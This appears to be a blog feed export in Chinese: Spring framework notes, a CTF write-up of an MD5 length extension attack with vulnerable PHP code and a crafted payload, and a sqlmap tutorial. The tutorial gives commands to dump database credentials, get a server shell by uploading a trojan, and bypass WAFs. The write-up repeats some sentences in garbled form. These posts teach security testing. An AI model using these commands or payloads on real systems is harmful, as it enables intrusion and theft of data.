1.在容器启动时就创建好对象，并且保存在容器中了 2.任何时候获取都是取得的最开始创建的对象 request:在web环境下，同一次请求创建一个Bean实例 session:在web环境下，同义词会话创建一个Bean实例 后两者在实际开发中没有应用 静态工厂与实例工厂 Bean的创建默认就是利用框架的反射new出来的实例 工厂模式可以摒弃一些复杂的重复用到的参数，通过传入一些变化的参数来帮我们创建对象，也就是一个专门帮我们创建对象的类。 静态工厂：工厂本身不用创建对象，通过静态方法调用， 工厂类.方法名(); 实例工厂：工厂本身需要创建对象，要new一个工厂对象类，调用工厂对象的工厂方法来创建对象 12345678910public class AirPlaneStaticFactory&#123; public static AirPlane getAirPlane(String Leader)&#123; AirPlane.airPlane = new AirPlane(); AirPlane.setEngin("thunder"); AirPlane.setCapacity(300); AirPlane.setHandLength("100m"); AirPlane.setLeaderName(Leader); return AirPlane; &#125;&#125; 123456789&lt;!--静态工厂，指定哪个方法是工厂方法 class指定静态工厂的全类名 factory-method指定工厂方法，constructor-arg可以为工厂传参--&gt;&lt;bean id="AirPlane1" class="com.ss.AirPlaneStaticFactory" factory-method="getAirPlane"&gt; &lt;!--为方法指定参数--&gt; &lt;constructor-arg value="sisi"&gt;&lt;/constructor-arg&gt;&lt;/bean&gt; 1234567891011121314&lt;!--实例工厂，factory-method指定哪个方法是工厂方法--&gt;&lt;bean id="AirPlaneInstanceFactory" class="com.ss.AirPlaneInstanceFactory"&gt;&lt;/bean&gt;&lt;!--factory-bean:指定当前对象创建使用哪个工厂 1.先配置实例工厂对象 2.配置我们要创建的Airplane使用哪个工厂创建 1）factory-bean:指定使用哪个工厂实例 2）factory-method:使用哪个工厂方法--&gt;&lt;bean id="AirPlane2" class="com.ss.AirPlane" factory-bean="AirPlaneInstanceFactory" factory-method="getAirPlane"&gt; &lt;constructor-arg value="sisi"&gt;&lt;/constructor-arg&gt;&lt;/bean&gt; 通过实现Spring的一个接口FactoryBean，并在xml中配置信息，也能通过工厂类构造实例对象 无论在实现类里配置了是否是单例，都是在获取的时候才创建的对象 Bean的生命周期 也就是Bean的创建和销毁 在IOC容器中的Bean:1.单例Bean在容器启动的时候就会创建好，容器关闭就会销毁；2.多实例的Bean，获取的时候才会创建 我们可以为Bean自定义一些生命周期方法，在其创建和销毁的时候调用指定的方法 1&lt;bean id="book1" class="com.ss.Book" destroy-method="MyDestroy" init-method=",MyInit"&gt;&lt;/bean&gt; 多实例的对象不会调用Bean销毁的方法 Bean的后置处理器 Spring有一个接口，后置处理器：BeanPostProcessor 可以在Bean的初始化前后调用方法 1.写一个实现类实现这个接口 2.将后置处理器注册在配置文件中 1`&lt;bean id="beanPostProcessor" class="com.ss.MyBeanPostProcessor"&gt;&lt;/bean&gt; 在后置处理器函数中返回的是什么，容器中保存的也就是什么，因此必须要返回原有的对象，不然就不能正确保存了 （容器启动）构造器–&gt;Before后置处理器–&gt;初始化方法–&gt;后置处理器After–&gt;（容器关闭）销毁方法 无论Bean是否有初始化方法，后置处理器都会默认其有，还会继续工作 Spring管理连接池 数据库连接池作为单实例最好的，一个项目就一个连接池，连接池管理很多连接，想要就从池子中拿，让Spring帮我们创建连接池对象。 123456&lt;bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource"&gt; &lt;property name="driverClassName" value="$&#123;jdbc.driver&#125;"&gt;&lt;/property&gt; &lt;property name="url" value="$&#123;jdbc.url&#125;"&gt;&lt;/property&gt; &lt;property name="username" value="$&#123;jdbc.username&#125;"&gt;&lt;/property&gt; &lt;property name="password" value="$&#123;jdbc.password&#125;"&gt;&lt;/property&gt;&lt;/bean&gt; 123//按照类型获取，还可以获取到该类型下的所有实现类子类DataSource bean = ioc.getBean(DataSource.class);bean.getConnection(); XML的自动装配 1&lt;bean id="persion" class="com.ss.Person" autowired="default"&gt;&lt;/bean&gt; default：不自动装配 byName:根据名字自动装配，以属性名作为ID去容器找到这个组件，给他赋值，如果找不到就装配null byType:根据类型自动装配,如果容器中有多个这种类型的组建就会报错，没找到装配null constructor:有参构造器自动装配，先按照参数类型进行装配，没有就装配null,如果找到多个匹配类型就继续按照ID去寻找，还是没有就匹配null.这种方式不会报错。如果是一个List对象，则会把容器中的所有匹配类型都装配 no:不自动装配，和default一样 SPEL Spring的注解方式注入 通过给bean上添加注解，可以快速把bean添加到IOC容器中 Spring有四个注解： @Controller：推荐给控制器层的组建添加这个注解（Servlet） @Service：推荐给业务逻辑层的组建添加这个注解 @Repository：给数据库层（持久化层，DAO）的对象添加这个注解 @Component：给不属于以上部分的组建添加这个注解 在某各类上添加任何一个注解都能快速将对象添加到IOC容器中，这几个注解原则上可以随便加，Spring不会区分这几个的区别，但是推荐各自层加各自层的注解，这是给程序员看的 使用注解快速将组件加入到容器中需要以下几步： 1.给要添加的组建上加四个注解中的注解 2.告诉Spring自动扫描添加的注解，依赖context名称空间 3.导入AOP包 1&lt;context:component-scan base-package=""&gt;&lt;/context:component-scan&gt; context:component-scan：自动组建扫描 base-package：指定扫描的基础包，把扫描包及它下面的所有包添加了注解的类，自动添加进IOC容器中 1.组件的ID默认就是组件的类名首字母小写（改名字可以在注解后加括号写上新名字） 2.组件的作用域，默认就是单例的，可以添加@scope注解切换作用域 注解只能导入自己写的类，对于其他包中的类，只能通过写xml来配置导入 使用context:exclude-filter指定扫描包时不包含的类 这里示例的expression取了@Controller的全类名 使用@Autowired实现注入 在需要注入的实现类上添加注解@Autowired可以自动注入容器中保存的那个实例 12@Autowiredprivate BookService bookService; 1.先按照类型去容器中寻找对应的组件：bookService=ioc.getBean(BookService.class) 2.找到就赋值，没找到就会抛异常 3.如果按类型找到多个，那么会按照变量名ID继续匹配 4.如果按照变量ID没有匹配上，就会报错 5.可以使用@Qualifier来指定一个组件的ID名，从而使Spring别把变量名作为ID名（同样的找到就装配，找不到就报错） 从上面可以看出Autowired的自动装配是一定要装配的，如果没匹配上就会报错，可以通过@Autowired(required=false)来实现寻找不到就装配null 如果在方法上有@Autowired的话，这个方法会在bean创建时候自动运行，这个方法的每一个参数都会自动注入相应的值 自动装配的其他注解 除了使用@Autowired实现注入外，还可以使用@Resource和@Inject。这几个都是自动装配的意思 但是这几个中只有Autowired最强大，这是Spring自己的注解 @Resource是J2ee的，也就是java自己的标准 @Inject是在EJB环境下实现的 @Resource的扩展性更强，如果切换成另外的容器框架，这个还是可以使用的，Autowired就不能使用了 使用Spring的单元测试方法 好处就是我们不用ioc.getBean()获取组件，直接Autowired组件，spring为我们自动装配 泛型依赖注入 Spring中可以使用带泛型的父类类型来确定子类的类型 Spring的IOC总结 AOP 面向切面编程，是基于OOP（面向对象编程）基础之上的 旨在程序运行期间，将某段代码动态地切入到指定方法的的指定位置去运行的这种编程方式 运用场景：在运行方法的同时进行日志记录 加日志记录的方法： 1.直接编写在方法内部：不推荐，修改维护麻烦，系统的辅助功能和核心业务逻辑耦合过高 2.另外新建一个记录日志的类，想要记录的地方调用函数：耦合度也很高，比上面那个稍微优雅了一点 3.我们希望这些辅助功能能够在核心功能运行期间，自己动态的加上 动态代理 如果可以拿到这个对象的代理，利用代理对象执行方法，如下所示： 12Calculator proxy = CalculatorProxy.getProxy(calculator);proxy.add(1,2); 下面是代理对象的类函数： 1234567891011121314151617181920212223242526272829303132333435363738394041/*帮Calculator.java生成代理对象的类Object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interface,InvocationHandler h)*/public class CalculatorProxy&#123; /* 为传入的参数对象创建一个动态代理对象 Calculator calculator：传入被代理对象 返回的是代理对象 */ public static Calculator getProxy(final Calculator calculator)&#123; //方法执行器，帮我们目标对象执行目标方法 InvocationHandler h = new InvocationHandler()&#123; /* Object proxy:代理对象，给jdk使用，任何时候都不要东这个对象 Method method：当前将要执行的目标方法 Object[] args:这个方法调用时外界传入的值 */ @Override public Object invoke(Object proxy,Method method,Object[] args) throw Throwable&#123; try&#123; //利用反射执行目标方法 //目标方法执行后的返回值 //方法执行前的日志 Object result = method.invoke(calculator,args); //方法执行后的日志 return result; &#125;catch(Exception e)&#123; //方法报错后的日志 &#125; &#125; &#125;; ClassLoader loader = calculator.getClass().getClassLoader(); Class&lt;?&gt;[] interface = calculator.getClass().getInterfaces(); //Proxy为目标对象创建代理对象 Objext proxy = Proxy.newProxyInstance(loader,interface,h); return (Calculator)proxy; &#125;&#125; 从上面代码可以看出，代理对象和被代理对象唯一产生的关联就是实现了同一个接口 但是动态代理也存在一些问题： 1.写起来难 2.jdk默认的动态代理，如果目标对象没有实现任何接口，是无法为他创建代理对象的 Spring实现了AOP功能，其底层就是动态代理：利用Spring可以一句代码都不写创建动态代理对象；实现简单额日期额没有强制要求目标对象必须实现接口 AOP的一些名词解释 AOP的简单配置 如何将这个类（切面类）中的这些方法（通知方法）动态的在目标方法运行的各个位置切入 配置步骤： 1.将目标类和切面类（封装了通知方法（在方法执行前后执行的方法））加入到IOC容器中 2.还应该告诉Spring哪个是切面类，使用@Aspect注解 3.告诉Spring切面类里的每一个方法都是何时何地运行的，同样可以在切面通知方法上添加注解实现 @Before:在目标方法之前运行 前置通知 @After：在目标方法运行结束之后 后置通知 @AfterReturning：在目标方法正常返回之后 返回通知 @AfterThrowing:在目标方法抛出异常之后 异常通知 @Around:环绕 环绕通知 以上是五个通知方法 123456789try&#123; @Before method.invoke(obj,args); @AfterReturning&#125;catch&#123; @AfterThrowing&#125;finally&#123; @After&#125; 4.还要写切入点表达式：execution(访问权限符 返回值类型 方法签名) 例如：@Before(“execution(public int com.ss.Mycalculator.add(int,int))”) 5.开启基于注解的AOP 测试步骤： 1.从IOC容器中拿到目标对象–注意，如果想要用类型获取对象，一定用它的接口类型，不要用它的本类 AOP的一些细节 1.AOP的底层是动态代理，容器中保存的是它的代理对象，所以在上面不能通过本类的类型来获取对象 如果本类没有实现接口，也可以通过getBean获得代理对象，此时代理对象是通过CGLib创建的 2.切入点表达式的写法：固定格式execution(访问权限符 返回值类型 方法全类名（参数表）) 通配符：*：1.匹配一个或者多个字符MyMath* 2.匹配任意一个参数（int,*） 3.*放在路径里只能匹配一层路径 4.*不能表示在权限位置处 双点：…：1.匹配任意多个参数和任意类型参数 （…） 2.匹配任意多层路径 com..Mymath 3.我们可以在通知方法运行的时候，拿到目标方法的详细信息 只需要在通知方法的参数列表写一个参数：JoinPoint:封装了当前目标方法的详细信息 123456789@Beforepublic static void logStart(JoinPoint joinPoint)&#123; //获取目标方法运行时使用的参数 Object[] args = joinPoint.getArgs(); //获取到方法的签名 Signature signature = joinPoint.getSignature; String name = signature.getName(); System.out.println("...");&#125; 4.拿到目标方法返回的结果 1234@AfterReturning(value="execution(public int com.ss.Mycalculator.add(int,int))",returning="result")public static void logReturning(JoinPoint joinPoint,Object result)&#123; &#125; 告诉Spring用result来接受返回值 下面时接受异常： 1234@AfterReturning(value="execution(public int com.ss.Mycalculator.add(int,int))",throwing="exception")public static void logException(JoinPoint joinPoint,Exception exception)&#123; &#125; 抽取可重用的切入点表达式 1.随便声明一个没有实现的返回void的空方法 2.给方法上标注@Pointcut注解 3.在其他方法删去value值，替代为这个方法名，就可以实现切入点可重用了，改一处改所有 环绕通知 环绕通知是Spring中最强大的通知，它是前面四个通知的结合 环绕通知有一个参数ProceedingJoinPoint pjp 1234567891011121314151617@Around("hahaMyPoint()")public Object myAround(ProceedingJoinPoint pjp) throw Throwable&#123; Object[] args = pjp.getArgs(); //就是利用反射调用目标方法即可,就是method.invoke(obj,args) try&#123; //环绕前置 Object proceed = pjp.proceed(arg0); //环绕返回 &#125;catch(Exception e)&#123; //环绕异常 e.printStackTrace(); &#125;finally&#123; //环绕后置 &#125; //反射调用后的返回值也一定返回出去 return proceed;&#125; 环绕通知是优先于普通通知执行的： 多切面运行顺序 AOP的使用场景 1.AOP加日志报错在数据库 2.AOP做权限认证 3.AOP做安全检查 4.AOP做事务控制 声明式事务 要做事务首先需要操作数据库，Spring提供了JdbcTemplate能快捷的操作数据库 事务的核心就是将几个事件捆绑在一起，只能一起完成或者一起出错 事务的四个特性：原子性、一致性、隔离性、持久性 编程式事务： 123456789101112TransactionFilter&#123; try&#123; //获取连接 //设置非自动提交 chain.doFilter(); //提交 &#125;catch&#123; //回滚 &#125;finally&#123; //关闭连接释放资源 &#125;&#125; 声明式事务:以前的事务需要通过一系列复杂的编程来编写一个事务，替换为只需要告诉Spring哪个方法是事务方法即可，Spring自动进行事务控制 事务管理的代码的固定模式作为一种横切关注点，可以通过AOP方法模块化，进而借助SpringAOP框架实现声明式事务。自己要写这个切面还是很麻烦的 这个切面已经有了（事务切面=事务管理器） 是个事务管理器就可以在目标方法运行前后进行事务控制（事务切面）,我们目前使用DataSourceTransactionManager 快速为某个方法添加事务: 1.首先配置这个事务管理器，让其进行事务控制，就是配置一个bean标签 12345678&lt;!--1.配置这个事务管理器，让其进行事务控制--&gt;&lt;bean id="transactionManager" class="xxx.DataSourceTransactionManager"&gt; &lt;!--控制住数据源--&gt; &lt;property name="dataSource" ref="pooledDataSouece"&gt;&lt;/property&gt;&lt;/bean&gt;&lt;!--2.开启基于注解的事务模式:依赖tx名称空间--&gt;&lt;tx:annotation-driver transaction-manager="transactionManager"/&gt;&lt;!---3.给事务方法加注解--&gt; 事务细节 ioslation：事务的隔离级别 propagation：事务的传播行为 noRollbackFor：哪些异常事务可以不回滚（可以让原来默认回滚的异常设置为不回滚） noRollbackForClassName：传递的全类名，作用和上面一样 RollbackFor：哪些异常事务是要回滚的，原本不回滚的事务回滚（主要是出现了编译时异常） readOnly:设置事务为只读事务，可以进行事务优化，如果所有事件都是只读函数的话就可以加快查询速度 timeout-int：超时：事务超出指定执行时长后自动终止并回滚 异常分类： 1.运行时异常（非检查异常）：可以不用处理，默认都回滚 2.编译时异常（检查异常）：要么try-catch,要么throws，默认不回滚 事务的回滚：默认发生运行时异常都回滚，发生编译时异常不会回滚 事务的隔离级别 数据库事务并发产生的问题：脏读、不可重复读、幻读 为了使数据库各个并发事务不会相互影响，一个事务与其他事务的隔离程度称为隔离级别，隔离性越高，数据一致性就越好，但并发能力就会减弱 脏读问题： 不可重复读： 可重复读： 有事务的业务逻辑，容器中保存的时这个业务逻辑的代理对象 事务的传播行为 传播行为也就是事务的传播和事务的行为。如果有多个事务进行嵌套运行，子事务是否要和大事务公用一个事务 如果其他地方出现错误，已经执行的REQUEST_NEW都会成功 如果时REQUIRED,事务的属性都是继承与大事务的，REQUEST_NEW都可以自己调整 本类方法的嵌套只会有一个事务，因为相当于直接把本类方法的代码直接复制过来，并没有经过Spring容器进行处理 环境搭建 1.导入sql文件，导入jar包 2.写几个类和方法模拟结账操作 Spring中Java配置 在SpringBoot中使用注解的方式来代替了xml来配置连接池子，因为以前在每写一个实现类就需要在XML文件中添加这个实现类的bean，显得十分繁琐，而SpringBoot中的配置主要是靠Java类和一些注解来达到和xml配置相同的效果，比较常用的注解有： @Configuration：声明一个类作为配置类，代替xml文件 @Bean：声明在方法上，将方法的返回值加入Bean容器，代替&lt;bean&gt;标签 @Value:属性注入 @PropertySource:指定外部属性文件 @Value的作用 @Value作用 SpringBoot优雅的属性注入 1.如果沿用Spring中的注入方法，可能会想到使用@PropertySource(&quot;classpath:application.properties&quot;)，这是通过读取外部的一个静态文件来获取数据，在函数里就可以使用@Value来实现注入，如下所示 12345678@Value("$&#123;jdbc.url&#125;")String url;@Value("$&#123;jdbc.driveClassName&#125;")String driveClassName;@Value("$&#123;jdbc.username&#125;")String username;@Value("$&#123;jdbc.password&#125;")String password; 2.在SpringBoot中会采用一种更加优雅的注入方式，可以不妨另外新建一个properties配置类，在配置类里将数据先注入到Sping容器中，然后在其他文件中注入调用，下面是名为JdbcProperties.java的配置类，可以将jdbc的几个重要参数注入： 123456789101112import lombok.Data;import org.springframework.boot.context.properties.ConfigurationProperties;@ConfigurationProperties(prefix = "jdbc") //配置属性,通过在//application.properties中寻找前缀为指定单词的目标进行注入@Datapublic class JdbcProperties &#123; String url; String driveClassName; String username; String password;&#125; 这里使用了@Data的注解，这里引用了一个叫lombok的模块，他可以自动给下面的几个参数生成get和set等方法，因为set和get方法是注入不可缺少的，可以说就是通过set方法实现的注入，使用get方法执行获取。 在另一个jdbcconfig.java文件中提取了这些参数，如下所示： 1234567891011121314@Configuration@EnableConfigurationProperties(JdbcProperties.class) //与//JdbcProperties里的ConfigurationProperties相对应，后者用于注入public class JdbcConfig &#123; @Bean public DataSource dataSource(JdbcProperties prop)&#123; DruidDataSource dataSource = new DruidDataSource(); dataSource.setDriverClassName(prop.getDriveClassName()); dataSource.setUrl(prop.getUrl()); dataSource.setUsername(prop.getUsername()); dataSource.setPassword(prop.getPassword()); return dataSource; &#125;&#125; 另外上面程序中的@Configuration是配置类的一个标识符，可以和后面出现的@Bean组合使用，也是用来执行注入。@Configuration：声明一个类作为配置类，代替xml文件。@Bean：声明在方法上，将方法的返回值加入Bean容器，代替&lt;bean&gt;标签 其实JdbcProperties prop不仅仅可以当作传入参数，而且可以在前面使用注解@Autowired执行注入 12@AutowiredJdbcProperties jdbcProperties; 3.一种更优雅的注入方式，此时不需要JdbcProperties.java了，在使用文件中将代码改成如下： 12345678@Configurationpublic class JdbcConfig &#123; @Bean @ConfigurationProperties(prefix = "jdbc") public DataSource dataSource()&#123; return new DruidDataSource(); &#125;&#125; 在这里@ConfigurationProperties会自动检查函数返回的对象是否有想要注入的那四个对象的set方法，如果有就会自动注入，并返回。最后被Bean注入到Spring容器中。这种方式通常是在只是用一次的场合 SpringMVC的一些小点 注解配置]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF题目-哈希长度拓展攻击]]></title>
    <url>%2F2019%2F07%2F09%2FCTF%E9%A2%98%E7%9B%AE-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[题目地址：http://www.shiyanbar.com/ctf/1848 Message authentication codes (MACs)是用于验证信息真实性的。一般的MAC算法是这样的：服务器把secret和message连接到一起，然后用消息摘要算法如MD5或SHA1取摘要。研究发现MD4、MD5、RIPEMD-160、SHA-0、SHA-1、SHA-256、SHA-512、WHIRLPOOL等摘要算法受此攻击，但MD2、SHA-224和SHA-384不受此攻击。 这是一张MD5算法的流程图，根据这张图我们可以把MD5算法的流程，简单分为下面几步： 1.把消息分为n个消息块。 2.对最后一个消息块进行消息填充。 3.每个消息块会和一个输入量做运算，把运算结果作为下一个输入量。 计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit 的消息（即64 byte ）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为： 1234A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476 无需关心计算细节，我们只需要知道经过一次消息再要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。 拓展攻击的实现 下面是一道CTF题目中获取的服务器端PHP代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php&lt;html&gt;&lt;body&gt;&lt;pre&gt;$flag = "XXXXXXXXXXXXXXXXXXXXXXX";$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!$username = $_POST["username"];$password = $_POST["password"];if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123;# ===俩边不管值还是类型都要一致 if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag);#exit()/die() 函数输出一条消息，并退出当前脚本 &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125;setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE["source"])) &#123; setcookie("source", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE["source"] != 0) &#123; echo ""; // This source code is outputted here &#125;&#125; &lt;/pre&gt;&lt;h1&gt;Admins Only!&lt;/h1&gt;&lt;p&gt;If you have the correct credentials, log in below. If not, please LEAVE.&lt;/p&gt;&lt;form method="POST"&gt; Username: &lt;input type="text" name="username"&gt; &lt;br&gt; Password: &lt;input type="password" name="password"&gt; &lt;br&gt; &lt;button type="submit"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;?&gt; flag获取的要求是：传进一个cookie使getmein等于md5(secret.urldecode(secret . urldecode(secret.urldecode(username . $password))且后面部分不能为adminadmin, 也就是说需要构造getmein的cookie和他那串字符相同就可以。 我们已知当username和password都等于admin时得到的MD5摘要值，想要构造一个password，能够知道得到的MD5值 已知$secret长度为15，先进行消息的填充，前面的A是随便写的，为了占15个字符。填充如下: 然后在后面跟加附加值，随便写什么： 然后去掉前面原本的username值，剩余的就是需要输入的password值： adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00dawn urlencode之后为: adminadmin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00dawn 现在我们在不知道具体 secret的情况下，已经得知了md5(secert+adminadmin)的值为571580b26c65f306376d4f64e53cb5c7，以及​secret 的情况下，已经得知了md5(secert+adminadmin)的值为571580b26c65f306376d4f64e53cb5c7，以及​secret的情况下，已经得知了md5(secert+adminadmin)的值为571580b26c65f306376d4f64e53cb5c7，以及​sercret的位数。而我们得到的 hash 值正是下一轮摘要经过高地位互换的链变量。 在网上找到计算MD5的代码，只要把初始向量变成已知的那个HASH值就可以了。]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Hash</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP的使用]]></title>
    <url>%2F2019%2F07%2F05%2FSQLMAP%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Sqlmap使用 Sqlmap有一些常用的命令后缀，详细见 命令大全 GET注入 查找Mysql数据库中的名称 python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; --dbs 然后Sqlmap会自动进行sql注入，可以在注入过程中选择注入的方式，筛选掉可能性不大的数据库，最后工具能够显示出所有数据库的名称，如下图所示 查找表的名称 经过上述的阶段获取数据库的名称后，就可以用来注入查找各个表的名称，以BWVS数据库为例 python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; -D BWVS --tables 很快工具就能够返回BWVS数据库下的各个表的名称，如下图所示： 查找字段的名称 同理可以通过数据库，表来查找到里面字段的名称，以BWVS中的user表为例： python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; -D BWVS -T user --columns 工具输出的结果如下图所示： 获取字段的值 对于上述扫描出的结果，即bill,pwd,uid,uname这几个字段名称，可以通过如下指令来注入获取字段下的值 python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; -D BWVS -T user -C &quot;bill,pwd,uid,uname&quot; --dump 输出的结果如下所示： 检测级别 –level参数 此参数用于指定检测级别，有1~5共5级。默认为1，表示做最少的检测，相应的，5级表示做最多的检测。 Sqlmap使用的payload保存在目录xml/payloads/中，是xml格式的，可以自己定制。节选一个payload如下所示： 12345678910111213141516&lt;test&gt; &lt;title&gt;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&lt;/title&gt; &lt;stype&gt;1&lt;/stype&gt; &lt;level&gt;2&lt;/level&gt; &lt;risk&gt;1&lt;/risk&gt; &lt;clause&gt;1&lt;/clause&gt; &lt;where&gt;1&lt;/where&gt; &lt;vector&gt;AND [INFERENCE]&lt;/vector&gt; &lt;request&gt; &lt;payload&gt;AND [RANDNUM]=[RANDNUM]&lt;/payload&gt; &lt;comment&gt;[GENERIC_SQL_COMMENT]&lt;/comment&gt; &lt;/request&gt; &lt;response&gt; &lt;comparison&gt;AND [RANDNUM]=[RANDNUM1]&lt;/comparison&gt; &lt;/response&gt; &lt;/test&gt; 在上例中可以看到有level标签，其值为2，该payload在检测级别大于等于2时被使用。 risk标签的含义见后文。 检测级别不仅会影响payload的使用，还会影响注入点的检测，GET和POST参数是一直会被检测的， 检测级别大于等于2时会检测cookie是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入。 若不是很清楚注入点在哪里可以设置一个比较高的检测级别。 强烈建议在向Sqlmap官方报告一个明确存在的注入漏洞检测不出来前先把检测级别调高试试。 –risk 此参数用于指定风险等级，有1~4共4级。默认风险等级为1，此等级在大多数情况下对测试目标无害。 风险等级2添加了基于时间的注入测试，等级3添加了OR测试。 若注入点是在UPDATE语句中，使用OR测试可能会修改整个表的数据，这显然不是攻击者想要看到的。 因此用户需要能控制风险等级避开有潜在风险的payload。 POST注入 可以通过使用–method=METHOD 强制使用给定的HTTP方法 如与网站是通过POST来传递信息，则需要使用到BRUP截获请求包，然后将请求包中的内容前加到sqlmap的后缀中实行注入，例如： --data=DATA 通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data=&quot;id=1&quot; -f --banner --dbs --users cookie注入 如果网站需要账号密码登陆，则在进行SQL注入测试时可以考虑使用cookie，使用方法就是在命令末尾添加-cookie，下面是一个例子： D:\sqlmap&gt;python sqlmap.py -u &quot;http://demo.rushrush.com/dvwa/vulnerabilities/sqli_blind/?id=221&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=6rub5m2okhp2ib7u7ruj76ebt1&quot; --dbs 通过以上命令可以像前文的相似命令一样获取数据库名字，cookie只不过多了一个登陆凭证而已 属性头注入 有些参数可能是通过一个包的属性头来传输的，因此可以通过属性头来进行SQL注入，在sqlmap中可以用--referer来实现注入，因为sqlmap可以在请求中伪造HTTP中的referer，当-level参数设定为3或者3以上的时候会尝试对referer注入 添加额外的HTTP头的参数为-headers 注入过程中*的使用 在输入过程中，在一个注入点后加*，可以使得该注入点的优先级别最高 命令执行 通过命令执行可以取得服务器端的shell sqlmap进行命名执行可以在语句后加后缀-os-shell 要执行以上命令，首先要确保该网页确实存在SQL注入漏洞 如上图所示选择服务器端语言，另外可以选择服务器端上传木马的目录，可以选择2来人为选定，前提是必须爆出网站的物理路径：此方法比较多，比如：PHPinfo文件，访问错误报路径，debug调试开启爆路径等。 上传木马成功后，可以通过访问上图所示的路径来执行，下图是访问该路径并执行命令显示当前路径所有文件的结果 数据包注入 因为前面那些添加属性头，增加cookie的方法比较麻烦，因此就出现了从文件读取数据包来进行注入的方式，其实现的后缀为-r 结合burpsuite来使用sqlmap： （1）浏览器打开目标地址http://www.antian365.com （2）配置burp代理(127.0.0.1:8080)以拦截请求 （3）点击登录表单的submit按钮 （4）Burp会拦截到了我们的登录POST请求 （5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下 （6）运行sqlmap并使用如下命令： ./sqlmap.py -r post.txt明显语句长度短了很多。。 常用参数 可以添加后缀-proxy来实现代理，例如-proxy &quot;http://127.0.0.1:8080&quot;可以实现burp的截获 -threads采用多线程，后面接想要的线程数 -sql-query执行指定的sql语句 file-read读取指定文件 file-write``file-dest写入本地文件，前面一个加本地目录，后一个加服务器的指定位置 dbms指定数据库类型（mysql,oracle,qostgreSQL…） tamper自定义脚本 sqlmap下的tamper文件夹下存放的是一些脚本，也可以通过添加自己写的脚本来运行。 WAF，Web Application Firewall，即网站应用级入侵防御系统，通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护，有很强的输入验证功能，通过一定的判断机制检测输入的内容是否含有非法攻击语句。 为了绕过输入验证，达到预期的SQL注入目标，须对原本SQL语句进行同义改写，这种改写在很多情况下是莫名其妙的，但就是这莫名其妙的语句可以通过严密的WAF防守，达到数据库层面。更为神奇的是，数据库可以执行这段看似奇怪的SQL语句，实现预期的攻击。 当原始注入遇到困难时，可尝试加载相应脚本，进行绕过，说不定会有意外惊喜。在sqlmap的原命令中加入以下代码，即可使用脚本，进行更加强有力的渗透。 --tamper“脚本名称” sqlmap版本当前为1.2.7.20，共有57个tamper脚本，与1.0版本相比新增了19个脚本。 sqlmap dns查询 利用sqlmap dns后缀来进行DNS查询，后缀为--dns-domain]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL MAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF题目-认真一点]]></title>
    <url>%2F2019%2F07%2F05%2FCTF%E9%A2%98%E7%9B%AE-%E8%AE%A4%E7%9C%9F%E4%B8%80%E7%82%B9%2F</url>
